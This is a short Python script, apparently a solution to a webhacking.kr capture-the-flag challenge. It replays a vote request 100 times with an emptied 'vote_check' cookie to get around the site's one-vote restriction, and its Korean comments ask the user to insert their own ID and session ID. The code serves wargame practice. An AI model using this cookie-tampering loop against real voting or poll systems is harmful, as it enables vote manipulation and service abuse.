import requests

url = 'https://webhacking.kr/challenge/code-5/?hit=자신의 webhacking.kr 아이디입력'

cookie = {'PHPSESSID':'자신의 PHPSESSID 입력','vote_check' :''} #vote_check 는 공백으로 해도됩니다

for i in range(100):
    re_vote = requests.get(url, cookies=cookie)
    print(f'vote : {i+1}')
